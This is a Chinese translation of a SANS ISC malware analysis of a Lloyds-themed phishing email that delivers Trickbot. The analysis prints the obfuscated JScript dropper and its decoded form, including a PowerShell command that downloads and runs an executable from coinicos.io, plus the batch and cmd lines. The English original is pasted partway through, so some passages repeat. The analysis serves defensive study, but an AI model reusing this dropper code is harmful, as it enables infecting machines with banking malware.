**网络钓鱼可以说是一个老生常谈的话题了，但时至今日它仍受到许多攻击者的欢迎。比如一封邮件，一个附件，一个链接地址，再配上一段美丽陷阱的谎言。这看似老套，却让受害目标一次又一次的沦陷。在不久前，我提取到了一个非常好的样本，该样本将证明钓鱼攻击活动仍然是感染计算机的绝佳方式！在以下场景中，目标用户采取了正确的方式，将其报告给了安全团队。**

让我们首先来回顾一下经典的初始邮件：

![Lloyds-20180509-1.PNG](https://image.3001.net/images/20180522/15269430724981.png!small)

当受害者点击链接时，初始屏幕将会模拟PDF文件。请注意，邮件正文中的密码未被使用。

![Lloyds-20180509-2.PNG](https://image.3001.net/images/20180522/1526943096783.png!small)

可以看到，假PDF文件仅向我们展示了一个空白的页面。大多数用户在这种情况下会怎么做？ 没错！他们会拖动鼠标向下滚动。这个事件可以被JavaScript拦截：

    
    
    window.onscroll = function (e) {  
      // called the malicious code.  
    } 

当受害者开始滚动时，会显示以下弹出窗口：

![Lloyds-20180509-3.PNG](https://image.3001.net/images/20180522/15269431202446.png!small)

这里要求用户安装被伪装成Windows JavaScript的Adobe PDF插件更新：“Adobe-PDF-Install.js”。

![Lloyds-20180509-4.PNG](https://image.3001.net/images/20180522/1526943136613.png!small)

以下为脚本的转储代码，为便于阅读已做相应优化：

    
    
    new Function(['var jingrang = new ActiveXObject("Scripting.FileSystemO', "blitzden", "MakcRulit586", "bearchuck", "swaybang"][0] +["foxlinux", "AVEVARUM", 'bject");
    var zitebrok = jingrang.GetSpecialFolder(2)+"\\\\\\\\ogc'][2] + ['igr.txt";
    var picture137 = jingrang.CreateTextFile(zitebrok, true);
    picture137.', "ANIKVOBOL", "welcomes", "multicast"][0] + ['WriteLine("dogstever");picture137.Close();
    var tuesaint ', "ANILAZARO", "capchaos", "ilivhsaivhcazd"][0] + ["houndchi", "SoulxGreatx", '= jingrang.GetFileVersion(zitebrok);
    if(typeof tuesaint == "string"', "labareda"][2] + ["vorezeak", ') {
      String.prototype.cultrulf = function () {
        var oscargator = []', "nguyen008"][1] + ["doctelecom", ';
        for (var i = 0; i < arguments.length; i++) {
          oscargator.p', "gryunaca"][1] + ['ush(arguments[i]);
        }
        return eval("String.fromCharCod', "banditcat", "taylor1970", "brabwhee"][0] + iiksniglO() + String.fromCharCode(Math.floor(Math.random() + 110)) + ['(",")+")");
      }
    };', "fledcinc", "cooledge"][0])();
    
    function iiksniglO(){
      return ("disintegrator", "pematric", "coupdrat", "sevenisis", 'e("+oscargator.joi'.banga123()) + clumblis() + 'oi';
    }
    
    function clumblis() {
      var objWMIService = GetObject("winmgmts:"); var o = "";
      try {
        var objLD = objWMIService.Get("Win32_LogicalDisk.DeviceID='y1:'"); o = "1";
      }
      catch (e) {
        o = '("+oscargator.j';} return o;
      }
      function String.prototype.banga123(){
        return this.split('').reverse().pop();
      }
      new Function("".cultrulf(118, 97, 114, 32, 102, 115, 111, 32, 61, 32, 110, 101, 119, 32) + ''.cultrulf(65, 99, 116, 105, 118, 101, 88, 79, 98, 106, 101, 99, 116, 40) +
     "".cultrulf(34, 83, 99, 114, 105, 112, 116, 105, 110, 103, 46, 70, 105, 108) + "".cultrulf(101, 83, 121, 115, 116, 101, 109, 79, 98, 106, 101, 99, 116, 34) + ''.cultrulf(41, 59, 118, 97, 114, 32, 116, 101, 109, 112, 32, 61, 32, 102) + "".cultrulf(115, 111, 46, 71, 101, 116, 83, 112, 101, 99, 105, 97, 108, 70) + ''.cultrulf(111, 108, 100, 101, 114, 40, 50, 41, 59, 118, 97, 114, 32, 115) + ''.cultrulf(99, 114, 105, 112, 116, 32, 61, 32, 34, 80, 111, 119, 101, 114) + "".cultrulf(83, 104, 101, 108, 108, 32, 92, 34, 102, 117, 110, 99, 116, 105) + ''.cultrulf(111, 110, 32, 69, 98, 102, 117, 56, 40, 91, 83, 116, 114, 105) + ''.cultrulf(110, 103, 93, 32, 36, 109, 99, 117, 100, 118, 108, 115, 108, 97) + "".cultrulf(41, 123, 40, 78, 101, 119, 45, 79, 98, 106, 101, 99, 116, 32) + ''.cultrulf(83, 121, 115, 116, 101, 109, 46, 78, 101, 116, 46, 87, 101, 98) + ''.cultrulf(67, 108, 105, 101, 110, 116, 41, 46, 68, 111, 119, 110, 108, 111) + "".cultrulf(97, 100, 70, 105, 108, 101, 40, 36, 109, 99, 117, 100, 118, 108) + ''.cultrulf(115, 108, 97, 44, 39, 34, 32, 43, 32, 116, 101, 109, 112, 32) + "".cultrulf(43, 32, 34, 92, 92, 110, 111, 113, 110, 119, 117, 116, 106, 46) + "".cultrulf(101, 120, 101, 39, 41, 59, 83, 116, 97, 114, 116, 45, 80, 114) + "".cultrulf(111, 99, 101, 115, 115, 32, 39, 34, 32, 43, 32, 116, 101, 109) + ''.cultrulf(112, 32, 43, 32, 34, 92, 92, 110, 111, 113, 110, 119, 117, 116) + "".cultrulf(106, 46, 101, 120, 101, 39, 59, 125, 116, 114, 121, 123, 69, 98) + "".cultrulf(102, 117, 56, 40, 39, 104, 116, 116, 112, 58, 47, 47, 99, 111) + ''.cultrulf(105, 110, 105, 99, 111, 115, 46, 105, 111, 47, 105, 109, 97, 103) + ''.cultrulf(101, 115, 47, 108, 111, 103, 111, 46, 98, 105, 110, 39, 41, 125) + ''.cultrulf(99, 97, 116, 99, 104, 123, 69, 98, 102, 117, 56, 40, 39, 104) + "".cultrulf(116, 116, 112, 58, 47, 47, 99, 111, 105, 110, 105, 99, 111, 115) + "".cultrulf(46, 105, 111, 47, 105, 109, 97, 103, 101, 115, 47, 108, 111, 103) + ''.cultrulf(111, 46, 98, 105, 110, 39, 41, 125, 34, 59, 118, 97, 114, 32) + ''.cultrulf(110, 97, 109, 101, 66, 97, 116, 32, 61, 32, 34, 115, 100, 106) + ''.cultrulf(107, 102, 104, 34, 59, 118, 97, 114, 32, 112, 97, 116, 104, 66) + "".cultrulf(97, 116, 32, 61, 32, 116, 101, 109, 112, 32, 43, 32, 34, 92) + "".cultrulf(92, 34, 32, 43, 32, 110, 97, 109, 101, 66, 97, 116, 32, 43) + ''.cultrulf(32, 34, 46, 98, 97, 116, 34, 59, 118, 97, 114, 32, 111, 117) + "".cultrulf(116, 70, 105, 108, 101, 32, 61, 32, 102, 115, 111, 46, 67, 114) + ''.cultrulf(101, 97, 116, 101, 84, 101, 120, 116, 70, 105, 108, 101, 40, 112) + "".cultrulf(97, 116, 104, 66, 97, 116, 44, 32, 116, 114, 117, 101, 41, 59) + ''.cultrulf(111, 117, 116, 70, 105, 108, 101, 46, 87, 114, 105, 116, 101, 76) + ''.cultrulf(105, 110, 101, 40, 115, 99, 114, 105, 112, 116, 41, 59, 111, 117) + ''.cultrulf(116, 70, 105, 108, 101, 46, 67, 108, 111, 115, 101, 40, 41, 59) + "".cultrulf(118, 97, 114, 32, 115, 104, 101, 108, 108, 32, 61, 32, 110, 101) + "".cultrulf(119, 32, 65, 99, 116, 105, 118, 101, 88, 79, 98, 106, 101, 99) + ''.cultrulf(116, 40, 34, 87, 83, 99, 114, 105, 112, 116, 46, 83, 104, 101) + ''.cultrulf(108, 108, 34, 41, 59, 115, 104, 101, 108, 108, 46, 114, 117, 110) + ''.cultrulf(40, 112, 97, 116, 104, 66, 97, 116, 44, 32, 48, 41, 59, 102) + ''.cultrulf(115, 111, 46, 68, 101, 108, 101, 116, 101, 70, 105, 108, 101, 40) + "".cultrulf(87, 83, 72, 46, 83, 99, 114, 105, 112, 116, 70, 117, 108, 108) + ''.cultrulf(78, 97, 109, 101, 41, 59))();
    Once the garbage code removed and some deobfuscation, you get some PowerShell code: (also beautified)
    
    var fso = new ActiveXObject("Scripting.FileSystemObject”);
    var temp = fso.GetSpecialFolder(2);
    var script = “
    PowerShell \"function Ebfu8([String] $mcudvlsla) {
      (New-Object System.Net.WebClient).DownloadFile($mcudvlsla,'" + temp + "\\noqnwutj.exe’);Start-Process '" + temp + "\\noqnwutj.exe’;}
      try{Ebfu8('http://coinicos.io/images/logo.bin’)}
    catch{Ebfu8('http://coinicos.io/images/logo.bin')}";var nameBat = "sdjkfh";var pathBt = temp + "\\" + nameBat + ".bat";var outFile = fso.CreateTextFile(pathBat, true);outFile.WriteLine(script);outFile.Close();var shell = new ActiveXObject("WScript.Shell");shell.run(pathBat, 0);fso.DeleteFile(WSH.ScriptFullName);
    It creates the following batch file in %TEMP%:
    
    PowerShell "function Ebfu8([String] $mcudvlsla){(New-Object System.Net.WebClient).DownloadFile($mcudvlsla,'C:\DOCUME~1\Xavier\LOCALS~1\Temp\noqnwutj.exe');Start-Process 'C:\DOCUME~1\Xavier\LOCALS~1\Temp\noqnwutj.exe';}try{Ebfu8('http://coinicos.io/images/logo.bin')}catch{Ebfu8('http://coinicos.io/images/logo.bin’)}
    And executes it via a CMD.exe:
    
    cmd /c ""C:\DOCUME~1\Xavier\LOCALS~1\Temp\sdjkfh.bat" "
    The compromised website ("coinicos.io") may think about a new crypto miner attack but it's not the case. The site is just used to deliver the payload. It is downloaded and executed by PowerShell. Its current VT score is 19/66 [1]. The PE file copies itself in %APPDATA%\Roaming\wsxmail\lloydt.exe and creates a scheduled task called “MsTools" for persistence (see my last diary[2]). This is a classic Trickbot[3]. To resume we have the following infection path:
    
    Email > JavaScript > PowerShell > Batch file > Scheduled task
    
    [1] https://www.virustotal.com/en/file/aff5fa4ec4cd78bcf5f1c712f361bbd7d428800bea08c23cae66f0947e66c2a3/analysis/1525780303/
    [2] https://isc.sans.edu/forums/diary/Adding+Persistence+Via+Scheduled+Tasks/23633/
    [3] https://securityintelligence.com/trickbots-cryptocurrency-hunger-tricking-the-bitcoin-out-of-wallets/
    
    Xavier Mertens (@xme)
    ISC Handler - Freelance Security Consultant
    PGP Key
    
    Xme
    
    380 POSTS
    ISC HANDL

移除垃圾代码以及反混淆处理后，你会得到一些PowerShell代码（已优化处理）：

    
    
    var fso = new ActiveXObject("Scripting.FileSystemObject”);
    var temp = fso.GetSpecialFolder(2);
    var script = “
    PowerShell \"function Ebfu8([String] $mcudvlsla) {
      (New-Object System.Net.WebClient).DownloadFile($mcudvlsla,'" + temp + "\\noqnwutj.exe’);Start-Process '" + temp + "\\noqnwutj.exe’;}
      try{Ebfu8('http://coinicos.io/images/logo.bin’)}
    catch{Ebfu8('http://coinicos.io/images/logo.bin')}";var nameBat = "sdjkfh";var pathBt = temp + "\\" + nameBat + ".bat";var outFile = fso.CreateTextFile(pathBat, true);outFile.WriteLine(script);outFile.Close();var shell = new ActiveXObject("WScript.Shell");shell.run(pathBat, 0);fso.DeleteFile(WSH.ScriptFullName);

它会在％TEMP％中创建以下批处理文件：

    
    
    PowerShell "function Ebfu8([String] $mcudvlsla){(New-Object System.Net.WebClient).DownloadFile($mcudvlsla,'C:\DOCUME~1\Xavier\LOCALS~1\Temp\noqnwutj.exe');Start-Process 'C:\DOCUME~1\Xavier\LOCALS~1\Temp\noqnwutj.exe';}try{Ebfu8('http://coinicos.io/images/logo.bin')}catch{Ebfu8('http://coinicos.io/images/logo.bin’)}

并通过CMD.exe执行：

    
    
    cmd /c ""C:\DOCUME~1\Xavier\LOCALS~1\Temp\sdjkfh.bat" "

被黑网站（“coinicos.io”）可能会考虑新的加密矿工攻击，但事实并非如此。该网站只是用来提供有效载荷，并由PowerShell下载和执行。目前的VT评分是19/66[[1](https://www.virustotal.com/en/file/aff5fa4ec4cd78bcf5f1c712f361bbd7d428800bea08c23cae66f0947e66c2a3/analysis/1525780303/)]。PE文件将自己复制到%APPDATA%\Roaming\wsxmail\lloydt.exe中，并创建一个名为“MsTools”的计划任务以实现控制的持久性（请参阅我的上一篇文章[[2](https://isc.sans.edu/forums/diary/Adding+Persistence+Via+Scheduled+Tasks/23633/)]）。这是一个经典的Trickbot[[3](https://securityintelligence.com/trickbots-cryptocurrency-hunger-tricking-the-bitcoin-out-of-wallets/)]。该钓鱼邮件的感染路径如下：

电子邮件> JavaScript> PowerShell>批处理文件>计划任务

[1]
<https://www.virustotal.com/en/file/aff5fa4ec4cd78bcf5f1c712f361bbd7d428800bea08c23cae66f0947e66c2a3/analysis/1525780303/>  
[2]
<https://isc.sans.edu/forums/diary/Adding+Persistence+Via+Scheduled+Tasks/23633/>  
[3] <https://securityintelligence.com/trickbots-cryptocurrency-hunger-tricking-the-bitcoin-out-of-wallets/>

***参考来源：[sans](https://isc.sans.edu/forums/diary/Nice%20Phishing%20Sample%20Delivering%20Trickbot/23641/)，FB小编
secist 编译，转载请注明来自FreeBuf.COM**  

